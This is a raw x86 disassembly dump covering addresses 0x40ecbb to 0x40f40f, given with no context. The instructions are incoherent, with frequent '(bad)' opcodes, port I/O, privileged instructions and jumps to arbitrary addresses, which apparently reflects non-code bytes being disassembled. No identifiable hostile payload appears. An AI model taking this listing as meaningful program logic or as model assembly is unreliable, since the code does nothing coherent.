  40ecbb:	cmp    BYTE PTR [eax+esi*2-0x78],0x75
  40ecc0:	sbb    ch,bl
  40ecc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecc4:	jmp    FWORD PTR [edx-0x7f]
  40ecc7:	cmp    DWORD PTR [ecx-0x71],0x39
  40eccb:	aam    0xf1
  40eccd:	cmp    eax,0xa1d617e3
  40ecd2:	cdq    
  40ecd3:	aaa    
  40ecd4:	adc    BYTE PTR [ecx-0x70707c8b],ch
  40ecda:	shl    DWORD PTR [edi],1
  40ecdc:	cli    
  40ecdd:	cmp    DWORD PTR [edx],ebp
  40ecdf:	fstp   QWORD PTR [ebp+0x2ad449a]
  40ece5:	js     0x40ec74
  40ece7:	loopne 0x40ec7c
  40ece9:	and    al,0x96
  40eceb:	push   DWORD PTR [esi-0x50]
  40ecee:	and    DWORD PTR [esi+ebx*1+0x3d],ebp
  40ecf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecf3:	xchg   DWORD PTR [esi-0x25],edx
  40ecf6:	popa   
  40ecf7:	out    dx,eax
  40ecf8:	mov    eax,0xdbd85fab
  40ecfd:	jo     0x40ecac
  40ecff:	stos   DWORD PTR es:[edi],eax
  40ed00:	jle    0x40ecf6
  40ed02:	fdiv   st,st(7)
  40ed04:	or     eax,0x1397d69b
  40ed09:	jge    0x40ed1d
  40ed0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed0c:	enter  0x7011,0xc5
  40ed10:	and    BYTE PTR [ecx-0x2c487696],dh
  40ed16:	add    al,BYTE PTR [ecx-0x73]
  40ed19:	dec    ecx
  40ed1a:	cmp    al,0xd0
  40ed1c:	test   BYTE PTR [esi],cl
  40ed1e:	adc    ecx,edx
  40ed20:	adc    DWORD PTR [eax+0x4f],0x22
  40ed24:	das    
  40ed25:	fbstp  TBYTE PTR [edi]
  40ed27:	loope  0x40ed87
  40ed29:	pop    edx
  40ed2a:	fcom   QWORD PTR [esi]
  40ed2c:	cmp    DWORD PTR [edi],ebx
  40ed2e:	in     eax,dx
  40ed2f:	xchg   esp,eax
  40ed30:	sub    eax,0x21424469
  40ed35:	lea    edi,[edi]
  40ed37:	ins    BYTE PTR es:[edi],dx
  40ed38:	aaa    
  40ed39:	ss add dl,al
  40ed3c:	jg     0x40ed89
  40ed3e:	jmp    0x41ca0fee
  40ed43:	mov    BYTE PTR [eax+0x5f],bl
  40ed46:	mov    ebx,0xd723b8e7
  40ed4b:	(bad)  
  40ed4c:	aam    0x1a
  40ed4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed4f:	jnp    0x40ece1
  40ed51:	rcl    edi,cl
  40ed53:	jmp    0x8a57:0x4ae1
  40ed59:	cmp    al,0xdd
  40ed5b:	xor    eax,0x9f14b37c
  40ed60:	push   ebx
  40ed61:	mov    ch,0x13
  40ed63:	daa    
  40ed64:	das    
  40ed65:	imul   ebx,esi,0x7b
  40ed68:	sub    BYTE PTR [edi-0x54],ch
  40ed6b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40ed6d:	xchg   edi,eax
  40ed6e:	mov    al,ds:0x94da5083
  40ed73:	jmp    0x40ed6e
  40ed75:	mov    WORD PTR [ebx+0x13],ds
  40ed78:	cdq    
  40ed79:	cdq    
  40ed7a:	pushf  
  40ed7b:	cmp    DWORD PTR [edx-0x27a75851],edx
  40ed81:	and    al,0x6d
  40ed83:	rcr    eax,0x84
  40ed86:	mov    dh,0x96
  40ed88:	out    0x49,al
  40ed8a:	in     eax,0x3e
  40ed8c:	ds cld 
  40ed8e:	mov    ds:0x7a40272f,eax
  40ed93:	push   cs
  40ed94:	clc    
  40ed95:	sti    
  40ed96:	mov    esi,ecx
  40ed98:	xchg   BYTE PTR [ebx+edx*8+0x25],cl
  40ed9c:	lahf   
  40ed9d:	hlt    
  40ed9e:	sahf   
  40ed9f:	jl     0x40ee16
  40eda1:	mov    al,al
  40eda3:	enterw 0x1372,0x60
  40eda8:	inc    esp
  40eda9:	jne    0x40ed42
  40edab:	aaa    
  40edac:	and    esp,0x6d5883df
  40edb2:	inc    ebx
  40edb3:	(bad)  
  40edb4:	icebp  
  40edb5:	push   ss
  40edb6:	int3   
  40edb7:	(bad)  
  40edb8:	iret   
  40edb9:	ficomp DWORD PTR [edi]
  40edbb:	les    ebx,FWORD PTR [di+0x752a]
  40edc0:	adc    cl,cl
  40edc2:	leave  
  40edc3:	pop    edi
  40edc4:	inc    ebx
  40edc5:	adc    edi,DWORD PTR [edx]
  40edc7:	fidiv  WORD PTR [esi-0x3bb4c963]
  40edcd:	aaa    
  40edce:	jbe    0x40ed63
  40edd0:	jae    0x40edd0
  40edd2:	push   es
  40edd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edd4:	inc    esi
  40edd5:	jne    0x40ee56
  40edd7:	jns    0x40ed8e
  40edd9:	test   DWORD PTR [esi],ebx
  40eddb:	das    
  40eddc:	mov    eax,ds:0xd9a1e70a
  40ede1:	xor    dh,BYTE PTR [ecx+0x4d6e075d]
  40ede7:	dec    edi
  40ede8:	sbb    eax,0x8d3cb3f9
  40eded:	popa   
  40edee:	lds    esp,FWORD PTR [ecx]
  40edf0:	ret    0xd022
  40edf3:	push   0x5003d70b
  40edf8:	repz shl DWORD PTR [esi+0x69],1
  40edfc:	mov    ds:0x6fa40475,al
  40ee01:	cmp    ebx,DWORD PTR [esi-0x5f]
  40ee04:	sub    eax,0x48d05cb3
  40ee09:	inc    edx
  40ee0a:	fs ret 0xe09
  40ee0e:	mov    ds:0xe05bcc44,eax
  40ee13:	xor    edx,edi
  40ee15:	dec    ecx
  40ee16:	ret    0x3d6b
  40ee19:	aad    0xd6
  40ee1b:	sub    DWORD PTR [ebx+0x46c63383],ebx
  40ee21:	pop    eax
  40ee22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee23:	dec    ecx
  40ee24:	hlt    
  40ee25:	fcmovbe st,st(4)
  40ee27:	and    bh,BYTE PTR [edx]
  40ee29:	test   DWORD PTR [edi-0x1e],ebx
  40ee2c:	inc    ecx
  40ee2d:	push   ds
  40ee2e:	pop    eax
  40ee2f:	mov    bl,BYTE PTR [edx+eiz*1+0x79]
  40ee33:	pop    ecx
  40ee34:	fild   WORD PTR [ebx+edi*8+0x27bbcbf]
  40ee3b:	and    edx,esi
  40ee3d:	mov    ss,WORD PTR [esi]
  40ee3f:	pop    eax
  40ee40:	push   0xee91a80b
  40ee45:	mov    ah,0xc7
  40ee47:	mov    eax,ds:0x3bbe06d0
  40ee4c:	dec    ebp
  40ee4d:	and    BYTE PTR [esi-0x2],ch
  40ee50:	repz neg BYTE PTR fs:[ebx-0x3c]
  40ee55:	inc    ebx
  40ee56:	cmc    
  40ee57:	xor    ebp,ebp
  40ee59:	push   es
  40ee5a:	adc    al,0x22
  40ee5c:	fisub  DWORD PTR [ebp-0x67]
  40ee5f:	dec    ebx
  40ee60:	not    BYTE PTR [edi-0x5f]
  40ee63:	push   ebx
  40ee64:	xlat   BYTE PTR ds:[ebx]
  40ee65:	into   
  40ee66:	shl    DWORD PTR [ecx-0x5a],0xf5
  40ee6a:	xchg   esi,eax
  40ee6b:	fadd   DWORD PTR [edi]
  40ee6d:	sbb    ecx,DWORD PTR [ecx+0x18e44612]
  40ee73:	in     eax,dx
  40ee74:	jmp    0x40ee6b
  40ee76:	cli    
  40ee77:	call   0x4e4a425
  40ee7c:	mov    ds:0xcdd2259c,eax
  40ee81:	jg     0x40eefd
  40ee83:	push   ebx
  40ee84:	aaa    
  40ee85:	iret   
  40ee86:	out    dx,eax
  40ee87:	sbb    al,BYTE PTR [edx-0x6]
  40ee8a:	push   esi
  40ee8b:	test   BYTE PTR [eax-0x68],bl
  40ee8e:	dec    eax
  40ee8f:	push   ecx
  40ee90:	lds    esi,FWORD PTR [ecx-0x354619c9]
  40ee96:	out    0xec,eax
  40ee98:	fisttp QWORD PTR [ebx]
  40ee9a:	cs retf 
  40ee9c:	lea    edx,[edx-0x2890364c]
  40eea2:	cmp    edi,DWORD PTR [edx+0x60]
  40eea5:	sahf   
  40eea6:	push   ss
  40eea7:	dec    esi
  40eea8:	cs in  eax,dx
  40eeaa:	cdq    
  40eeab:	mov    dl,BYTE PTR [edx-0x7]
  40eeae:	mov    ebx,0xadea3439
  40eeb3:	inc    edi
  40eeb4:	test   BYTE PTR [ecx+esi*4+0x2a],bl
  40eeb8:	test   BYTE PTR [edx],ah
  40eeba:	outs   dx,DWORD PTR ds:[esi]
  40eebb:	pop    ebx
  40eebc:	or     eax,esp
  40eebe:	retf   0x3869
  40eec1:	int3   
  40eec2:	div    DWORD PTR [eax-0x3cc4941a]
  40eec8:	jecxz  0x40eef2
  40eeca:	mov    edx,0x2ee81a5b
  40eecf:	inc    esp
  40eed0:	pop    es
  40eed1:	and    ecx,DWORD PTR [esp+eiz*4-0x2d]
  40eed5:	cld    
  40eed6:	dec    edi
  40eed7:	mov    dh,0x3b
  40eed9:	daa    
  40eeda:	xchg   esi,eax
  40eedb:	inc    esi
  40eedc:	jmp    0x40ee8a
  40eede:	cmc    
  40eedf:	cmp    esp,edi
  40eee1:	lods   eax,DWORD PTR ds:[esi]
  40eee2:	test   BYTE PTR [edx],dh
  40eee4:	(bad)  
  40eee5:	out    0x86,eax
  40eee7:	or     DWORD PTR [ebp+0x6fa901b1],eax
  40eeed:	jb     0x40eece
  40eeef:	imul   ebp,DWORD PTR [ebp+ecx*4-0x53],0x3d
  40eef4:	jle    0x40ef5f
  40eef6:	sbb    al,0x34
  40eef8:	neg    DWORD PTR [edi+0x4b]
  40eefb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eefc:	ret    0x30d5
  40eeff:	cmp    DWORD PTR [ecx+0xea19c54],0xbfb1471e
  40ef09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef0a:	repz hlt 
  40ef0c:	rol    DWORD PTR [ebp+ebp*4-0x340a45ca],cl
  40ef13:	dec    ecx
  40ef14:	dec    esi
  40ef15:	out    0xeb,eax
  40ef17:	fisttp DWORD PTR [edx-0x4a2050c7]
  40ef1d:	inc    ecx
  40ef1e:	xor    DWORD PTR [eax],eax
  40ef20:	jne    0x40eef4
  40ef22:	push   eax
  40ef23:	inc    ecx
  40ef24:	mov    edi,ecx
  40ef26:	aad    0xee
  40ef28:	adc    esp,DWORD PTR [edi+edi*1+0xd218fb5]
  40ef2f:	inc    eax
  40ef30:	xchg   ecx,eax
  40ef31:	out    dx,eax
  40ef32:	das    
  40ef33:	in     eax,dx
  40ef34:	loop   0x40ef29
  40ef36:	push   edi
  40ef37:	aaa    
  40ef38:	inc    DWORD PTR ds:0xb2172488
  40ef3e:	push   0x6d6dade8
  40ef43:	mov    ch,BYTE PTR [edx+eiz*1]
  40ef46:	fsubr  QWORD PTR [ebx-0xee376fe]
  40ef4c:	jg     0x40ef71
  40ef4e:	imul   ebp,DWORD PTR [eax-0x5d],0xffffffae
  40ef52:	fist   DWORD PTR [edi]
  40ef54:	icebp  
  40ef55:	ds xor ecx,ecx
  40ef58:	std    
  40ef59:	xchg   BYTE PTR [ebx+0x461080fe],cl
  40ef5f:	imul   ebp,ecx,0xffffff8b
  40ef62:	dec    esi
  40ef63:	cld    
  40ef64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef65:	repnz rcr BYTE PTR [edx],1
  40ef68:	lds    esi,FWORD PTR [ebx+0x55]
  40ef6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef6c:	ins    DWORD PTR es:[edi],dx
  40ef6d:	sub    dl,BYTE PTR [eax]
  40ef6f:	out    0x17,al
  40ef71:	sbb    eax,0xf6769227
  40ef76:	push   edx
  40ef77:	adc    DWORD PTR [edx*2-0x5e975394],eax
  40ef7e:	nop
  40ef7f:	in     al,dx
  40ef80:	shl    DWORD PTR [eax],1
  40ef82:	mov    al,BYTE PTR [ebx+0x3f]
  40ef85:	scas   eax,DWORD PTR es:[edi]
  40ef86:	dec    ebp
  40ef87:	sar    DWORD PTR [ebp-0x50d11ebc],0x52
  40ef8e:	je     0x40ef3b
  40ef90:	xor    BYTE PTR [eax+esi*4+0x7daa1a41],bl
  40ef97:	sbb    DWORD PTR [edx+0x1633b062],esi
  40ef9d:	fdivrp st(1),st
  40ef9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efa0:	cmp    al,BYTE PTR [ebx+eax*8+0x30]
  40efa4:	mov    BYTE PTR [esp+edi*8+0x619f26a4],bh
  40efab:	aaa    
  40efac:	xor    BYTE PTR [edi-0x51b66eb7],cl
  40efb2:	jns    0x40eff8
  40efb4:	dec    edi
  40efb5:	dec    esi
  40efb6:	dec    esi
  40efb7:	jns    0x40ef79
  40efb9:	xchg   esi,eax
  40efba:	adc    eax,0x808e9085
  40efbf:	neg    BYTE PTR [edi-0x63]
  40efc2:	mov    dh,0x79
  40efc4:	ds pop di
  40efc7:	sahf   
  40efc8:	adc    dl,0x44
  40efcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efcc:	enter  0xee81,0xd5
  40efd0:	int3   
  40efd1:	cdq    
  40efd2:	(bad)  [edx+edi*8+0x52]
  40efd6:	add    BYTE PTR [eax],cl
  40efd8:	rol    ebx,cl
  40efda:	ss dec edx
  40efdc:	icebp  
  40efdd:	scas   eax,DWORD PTR es:[edi]
  40efde:	xchg   esi,eax
  40efdf:	test   cl,bl
  40efe1:	pop    esi
  40efe2:	cmp    eax,0x1d53c06f
  40efe7:	fisttp QWORD PTR [eax+0x165ee655]
  40efed:	mov    esp,DWORD PTR [edx+eax*8-0x55dbdae4]
  40eff4:	loopne 0x40f025
  40eff6:	sub    BYTE PTR ss:[ebp+0x35f728ee],0xeb
  40effe:	adc    eax,0x8fcc8fc0
  40f003:	nop
  40f004:	mov    ds:0xe65aaa4b,al
  40f009:	push   ds
  40f00a:	lock in eax,0x41
  40f00d:	adc    esi,edx
  40f00f:	and    eax,0x131ab431
  40f014:	and    DWORD PTR ds:0xc7f9d653,0xfffffffa
  40f01b:	inc    eax
  40f01c:	or     bl,ah
  40f01e:	ja     0x40efbf
  40f020:	call   0xb5bd:0x7c0e27b
  40f027:	(bad)  
  40f028:	(bad)  [edi-0x1a]
  40f02b:	mov    ds:0x2cd6f40b,al
  40f030:	mov    cl,0xa4
  40f032:	lods   al,BYTE PTR ds:[esi]
  40f033:	dec    edi
  40f034:	push   ebp
  40f035:	sub    BYTE PTR [eax],dl
  40f037:	xchg   ebx,eax
  40f038:	mov    ds:0x9e57e55a,al
  40f03d:	retf   
  40f03e:	or     eax,0x32f73806
  40f043:	add    BYTE PTR [ebp+0x47],dh
  40f046:	xor    BYTE PTR [edx],al
  40f048:	cmc    
  40f049:	(bad)  
  40f04a:	leave  
  40f04b:	out    0x70,eax
  40f04d:	mov    ecx,esi
  40f04f:	and    eax,0xac885361
  40f054:	jne    0x40f0bd
  40f056:	mov    DWORD PTR [esi+0x448ac93a],esp
  40f05c:	cwde   
  40f05d:	jbe    0x40f0de
  40f05f:	mov    ebp,0xabdf8475
  40f064:	lea    ebp,[edx+0x4b]
  40f067:	pop    ds
  40f068:	cmp    eax,0xca46bf46
  40f06d:	out    dx,eax
  40f06e:	fs push edi
  40f070:	clc    
  40f071:	dec    esp
  40f072:	daa    
  40f073:	sbb    eax,0xe3ba2dfa
  40f078:	mov    cl,0x90
  40f07a:	and    eax,0x6e1dacc5
  40f07f:	xchg   esi,eax
  40f080:	mov    ebp,0xc5f2633
  40f085:	bound  eax,QWORD PTR [edx-0x7e18aaac]
  40f08b:	or     al,0xcc
  40f08d:	adc    edx,DWORD PTR [ebp+0x2ca88468]
  40f093:	out    0x84,eax
  40f095:	dec    BYTE PTR [edi-0x8961c60]
  40f09b:	pop    esi
  40f09c:	jp     0x40f0a1
  40f09e:	push   edx
  40f09f:	cmp    al,0xe
  40f0a1:	or     ebp,ecx
  40f0a3:	pop    ecx
  40f0a4:	mov    ?,WORD PTR [ebx]
  40f0a6:	mov    ebp,0xf385c9bf
  40f0ab:	mov    ebx,0x7fd7c549
  40f0b0:	out    0xec,eax
  40f0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0b3:	lods   eax,DWORD PTR ds:[esi]
  40f0b4:	mov    ebx,0xdf83d640
  40f0b9:	pusha  
  40f0ba:	imul   ebx,DWORD PTR [esi],0xe2a2f074
  40f0c0:	jae    0x40f112
  40f0c2:	loop   0x40f080
  40f0c4:	add    eax,0x6bef8734
  40f0c9:	icebp  
  40f0ca:	nop
  40f0cb:	lods   al,BYTE PTR ds:[esi]
  40f0cc:	gs mov ebp,0x8cb6504e
  40f0d2:	out    0xca,al
  40f0d4:	sti    
  40f0d5:	jle    0x40f0a6
  40f0d7:	cmp    eax,DWORD PTR [esi+ebx*2-0x14]
  40f0db:	and    eax,0x5b42af57
  40f0e0:	jl     0x40f07e
  40f0e2:	out    0xc3,eax
  40f0e4:	jmp    0x70297b89
  40f0e9:	mov    ah,0xa
  40f0eb:	lds    edx,FWORD PTR [edx+0x13]
  40f0ee:	push   esi
  40f0ef:	into   
  40f0f0:	add    al,0x67
  40f0f2:	dec    eax
  40f0f3:	pop    edx
  40f0f4:	fld    DWORD PTR [ebp+ebx*2-0x79]
  40f0f8:	popf   
  40f0f9:	(bad)  
  40f0fa:	cmp    eax,0x1dfd8fa6
  40f0ff:	sub    BYTE PTR [edx-0x4c],bl
  40f102:	and    esi,eax
  40f104:	sahf   
  40f105:	sub    eax,0xb2d886b4
  40f10a:	popf   
  40f10b:	push   ebx
  40f10c:	sub    dh,BYTE PTR [ebp-0x5d31e225]
  40f112:	or     ch,BYTE PTR [esp+eiz*8-0xe]
  40f116:	sub    eax,0x8c7531b
  40f11b:	adc    cl,BYTE PTR [ebx-0x43]
  40f11e:	jmp    0x40f13d
  40f120:	cmp    dh,0x22
  40f123:	cmc    
  40f124:	fwait
  40f125:	mov    ecx,0x66a59db2
  40f12a:	int    0x4a
  40f12c:	(bad)  
  40f12d:	adc    BYTE PTR [ecx+0x6ff1ba5],bh
  40f133:	sbb    al,0x3a
  40f135:	cmp    bl,al
  40f137:	cs jb  0x40f0c3
  40f13a:	dec    ecx
  40f13b:	mov    ss,eax
  40f13d:	pop    ebx
  40f13e:	cmp    cl,BYTE PTR [edi+0x64816bcc]
  40f144:	scas   al,BYTE PTR es:[edi]
  40f145:	dec    ebx
  40f146:	add    DWORD PTR [edx],ecx
  40f148:	repnz leave 
  40f14a:	dec    esp
  40f14b:	sub    DWORD PTR [ebp+0x117e7692],0x51b26f20
  40f155:	or     esi,eax
  40f157:	cmp    DWORD PTR [esp+ebx*8+0x53],esi
  40f15b:	dec    edx
  40f15c:	lea    ebx,[eax-0x52]
  40f15f:	adc    ebp,DWORD PTR [ecx-0x7d]
  40f162:	aad    0x44
  40f164:	adc    eax,0xbf96ea2b
  40f169:	inc    eax
  40f16a:	pop    edx
  40f16b:	into   
  40f16c:	adc    ecx,DWORD PTR [esi-0x1f7f6609]
  40f172:	sub    DWORD PTR [esi],0x3b
  40f175:	gs mov es,eax
  40f178:	or     eax,0x3db0b00
  40f17d:	mov    ebx,0xe120736c
  40f182:	stos   DWORD PTR es:[edi],eax
  40f183:	fdiv   DWORD PTR [ebp-0x6]
  40f186:	jmp    0xb677:0x1120a1aa
  40f18d:	xchg   ebx,eax
  40f18e:	cmp    DWORD PTR [eax],esp
  40f190:	mov    BYTE PTR [ebx+0x3045a185],dh
  40f196:	adc    al,dh
  40f198:	call   0xab4d:0xea12ac5b
  40f19f:	cmc    
  40f1a0:	ss call 0xa3ea:0x8b9d53b
  40f1a8:	xchg   ebp,eax
  40f1a9:	in     eax,0x9e
  40f1ab:	sub    al,0xb9
  40f1ad:	jbe    0x40f1e3
  40f1af:	fwait
  40f1b0:	dec    ebx
  40f1b1:	iret   
  40f1b2:	mov    ecx,0xf159a4c9
  40f1b7:	sub    al,0xf0
  40f1b9:	in     al,dx
  40f1ba:	clc    
  40f1bb:	xor    eax,0x9214b6f7
  40f1c0:	add    BYTE PTR [eax],cl
  40f1c2:	mov    al,0x7d
  40f1c4:	dec    edi
  40f1c5:	jae    0x40f1b2
  40f1c7:	mov    edx,0xf54d4d12
  40f1cc:	addr16 jo 0x40f197
  40f1cf:	test   al,0x2c
  40f1d1:	and    esp,DWORD PTR [edx]
  40f1d3:	cmp    DWORD PTR [edx-0x51],eax
  40f1d6:	xchg   ebx,eax
  40f1d7:	dec    ebp
  40f1d8:	dec    edx
  40f1d9:	mov    edx,0x6ed3b0b1
  40f1de:	stos   DWORD PTR es:[edi],eax
  40f1df:	call   0xb44f4c2a
  40f1e4:	test   BYTE PTR [edi+ecx*8+0x37],ah
  40f1e8:	add    eax,0xc7536a1c
  40f1ed:	lock xor al,0x26
  40f1f0:	aaa    
  40f1f1:	inc    edx
  40f1f2:	xor    DWORD PTR [ecx-0x37ec2847],0x44683f2f
  40f1fc:	xchg   edx,eax
  40f1fd:	xchg   edx,eax
  40f1fe:	jno    0x40f1b6
  40f200:	and    al,0xfd
  40f202:	pop    es
  40f203:	sbb    eax,0x1d3657c4
  40f208:	call   0x594351f6
  40f20d:	or     BYTE PTR [ebx-0x29],bh
  40f210:	jg     0x40f246
  40f212:	mul    BYTE PTR [eax]
  40f214:	inc    esi
  40f215:	mov    esp,DWORD PTR [ecx-0x59]
  40f218:	ja     0x40f1de
  40f21a:	arpl   WORD PTR [ebp+0xbe2addb],bp
  40f220:	push   esi
  40f221:	bound  eax,QWORD PTR [eax]
  40f223:	ss ret 
  40f225:	hlt    
  40f226:	rcr    BYTE PTR [esi],1
  40f228:	repz mov dl,BYTE PTR [edx]
  40f22b:	sbb    DWORD PTR [esi-0x60],edx
  40f22e:	mov    bl,0xea
  40f230:	inc    eax
  40f231:	cmp    bh,cl
  40f233:	fld    TBYTE PTR [eax+ebp*2]
  40f236:	sahf   
  40f237:	ins    DWORD PTR es:[edi],dx
  40f238:	fwait
  40f239:	popf   
  40f23a:	xlat   BYTE PTR ds:[ebx]
  40f23b:	test   al,0xae
  40f23d:	scas   al,BYTE PTR es:[edi]
  40f23e:	sbb    DWORD PTR [ecx+0x5391355b],ecx
  40f244:	and    ah,BYTE PTR [edx-0x3823a2e6]
  40f24a:	sub    ebx,DWORD PTR [ebp+0xf7252f8]
  40f250:	repz sar ebp,1
  40f253:	int3   
  40f254:	adc    DWORD PTR [ebx-0x4d106755],0xd8c60ec5
  40f25e:	jnp    0x40f277
  40f260:	push   ds
  40f261:	push   ds
  40f262:	int3   
  40f263:	mov    edx,DWORD PTR [ebp-0x23]
  40f266:	add    al,ch
  40f268:	ret    0x7950
  40f26b:	pop    ebp
  40f26c:	cmp    DWORD PTR [edi-0x5fa0c39c],ecx
  40f272:	hlt    
  40f273:	mov    ecx,0x4908b8a
  40f278:	mov    cl,0x14
  40f27a:	jmp    0x7d613987
  40f27f:	jne    0x40f26f
  40f281:	dec    DWORD PTR [ecx]
  40f283:	jg     0x40f255
  40f285:	push   0xffffffc9
  40f287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f288:	outs   dx,BYTE PTR ds:[esi]
  40f289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f28a:	sbb    eax,DWORD PTR [edi+0x37fb5c93]
  40f290:	pop    es
  40f291:	mov    cl,0x77
  40f293:	in     eax,0x29
  40f295:	jo     0x40f29e
  40f297:	loop   0x40f308
  40f299:	adc    eax,0x55c7569
  40f29e:	popa   
  40f29f:	jmp    0x79d4:0xec14a316
  40f2a6:	int3   
  40f2a7:	loop   0x40f229
  40f2a9:	sbb    DWORD PTR [ebx-0x67efc0cd],esi
  40f2af:	cwde   
  40f2b0:	fdiv   QWORD PTR [ecx+0x42609d1b]
  40f2b6:	mov    bl,0x23
  40f2b8:	ficom  DWORD PTR [ecx+edx*4]
  40f2bb:	int3   
  40f2bc:	inc    ecx
  40f2bd:	push   edi
  40f2be:	inc    ebx
  40f2bf:	jle    0x40f24b
  40f2c1:	rcl    ebp,0x85
  40f2c4:	push   edx
  40f2c5:	push   es
  40f2c6:	mov    ah,0xbd
  40f2c8:	mov    al,ds:0xf6c30885
  40f2cd:	stos   BYTE PTR es:[edi],al
  40f2ce:	nop
  40f2cf:	adc    al,0xb5
  40f2d1:	inc    eax
  40f2d2:	test   al,0x2c
  40f2d4:	leave  
  40f2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2d6:	imul   edi,DWORD PTR [edi+0x184f5e35],0x23394563
  40f2e0:	enter  0x9ce9,0x17
  40f2e4:	mov    ecx,0x5cf8126
  40f2e9:	mov    al,ds:0x45820a91
  40f2ee:	imul   edi,esi,0xa
  40f2f1:	adc    dl,BYTE PTR [ebp-0x11]
  40f2f4:	xlat   BYTE PTR ds:[ebx]
  40f2f5:	inc    edx
  40f2f6:	push   esp
  40f2f7:	or     DWORD PTR [edx-0x28c43664],0xffffffd4
  40f2fe:	in     eax,dx
  40f2ff:	cld    
  40f300:	cmp    eax,DWORD PTR [edi+0x2d]
  40f303:	cli    
  40f304:	outs   dx,BYTE PTR ds:[esi]
  40f305:	push   cs
  40f306:	mov    dl,0x72
  40f308:	data16 add al,0xdd
  40f30b:	imul   bh
  40f30d:	push   eax
  40f30e:	inc    ebp
  40f30f:	and    bl,cl
  40f311:	out    dx,eax
  40f312:	(bad)  
  40f313:	daa    
  40f314:	push   cs
  40f315:	jne    0x40f396
  40f317:	cmp    BYTE PTR [edx],bl
  40f319:	ret    0xd52f
  40f31c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f31d:	push   esi
  40f31e:	sti    
  40f31f:	and    edx,DWORD PTR [ebx-0x4b]
  40f322:	pop    edx
  40f323:	jl     0x40f3a2
  40f325:	cs popf 
  40f327:	push   es
  40f328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f329:	and    BYTE PTR [esi+0x30476640],bh
  40f32f:	ins    BYTE PTR es:[edi],dx
  40f330:	add    DWORD PTR [ebx-0x55142979],ebp
  40f336:	pop    ebp
  40f337:	sub    al,BYTE PTR [edx]
  40f339:	imul   edi,DWORD PTR [edx-0x34],0x1f13b240
  40f340:	out    0x95,al
  40f342:	(bad)  
  40f343:	int3   
  40f344:	inc    ebx
  40f345:	dec    ebx
  40f346:	cmp    eax,0xca7592f2
  40f34b:	pop    ds
  40f34c:	sbb    dh,BYTE PTR [edx-0x5aaa12f9]
  40f352:	cmp    BYTE PTR [eax-0x72174c3f],0xe0
  40f359:	fstp   QWORD PTR [ebp-0x13c2bd67]
  40f35f:	sub    al,0xb0
  40f361:	popa   
  40f362:	mov    eax,0x18a90aac
  40f367:	add    esi,DWORD PTR [edi-0x244f6619]
  40f36d:	inc    ebp
  40f36e:	sbb    DWORD PTR [ebx-0x44],0x2
  40f372:	ds dec eax
  40f374:	iret   
  40f375:	mov    dh,0xd1
  40f377:	pop    esp
  40f378:	rol    DWORD PTR [eax-0x3dd2c287],0x44
  40f37f:	lods   al,BYTE PTR ds:[esi]
  40f380:	pushf  
  40f381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f382:	sbb    al,0x50
  40f384:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40f386:	cmp    DWORD PTR ds:0xdb34d6c2,esp
  40f38c:	fdiv   QWORD PTR [esi-0x65]
  40f38f:	mov    DWORD PTR [ebx+0x213482ee],ecx
  40f395:	out    0xf9,al
  40f397:	fcmove st,st(5)
  40f399:	pop    ebx
  40f39a:	sub    ebx,DWORD PTR [ebx+0x6472c7b1]
  40f3a0:	fneni(8087 only) 
  40f3a2:	retf   0xb35c
  40f3a5:	pop    ss
  40f3a6:	push   eax
  40f3a7:	dec    ebx
  40f3a8:	fwait
  40f3a9:	in     eax,dx
  40f3aa:	cmc    
  40f3ab:	mov    edi,0x6289616c
  40f3b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3b1:	das    
  40f3b2:	in     al,dx
  40f3b3:	push   ebx
  40f3b4:	mov    ecx,0x1bbf478c
  40f3b9:	pop    ds
  40f3ba:	cli    
  40f3bb:	shl    BYTE PTR [eiz*2-0x1e50fc45],0xa
  40f3c3:	mov    ch,0x69
  40f3c5:	mov    ch,0xe9
  40f3c7:	mov    al,0x44
  40f3c9:	xor    ebp,DWORD PTR [eax+eax*8-0x7d8c6b85]
  40f3d0:	push   es
  40f3d1:	int    0x90
  40f3d3:	add    BYTE PTR [ecx-0x7e],al
  40f3d6:	pop    ds
  40f3d7:	adc    eax,0x80288665
  40f3dc:	(bad)
  40f3df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3e0:	xchg   ch,ch
  40f3e2:	push   esi
  40f3e3:	shr    eax,0x33
  40f3e6:	aas    
  40f3e7:	ins    DWORD PTR es:[edi],dx
  40f3e8:	push   esp
  40f3e9:	inc    edi
  40f3ea:	jne    0x40f3e5
  40f3ec:	push   edi
  40f3ed:	daa    
  40f3ee:	mov    al,ds:0xf7a365cd
  40f3f3:	repz jmp 0x40f437
  40f3f6:	jno    0x40f432
  40f3f8:	div    dh
  40f3fa:	and    al,0xfb
  40f3fc:	loopne 0x40f470
  40f3fe:	xchg   esp,eax
  40f3ff:	arpl   WORD PTR [eax],cx
  40f401:	ds std 
  40f403:	push   ds
  40f404:	lods   al,BYTE PTR ds:[esi]
  40f405:	leave  
  40f406:	jnp    0x40f442
  40f408:	xchg   esi,eax
  40f409:	add    eax,DWORD PTR [eax-0x1c98abd1]
  40f40f:	(bad)  
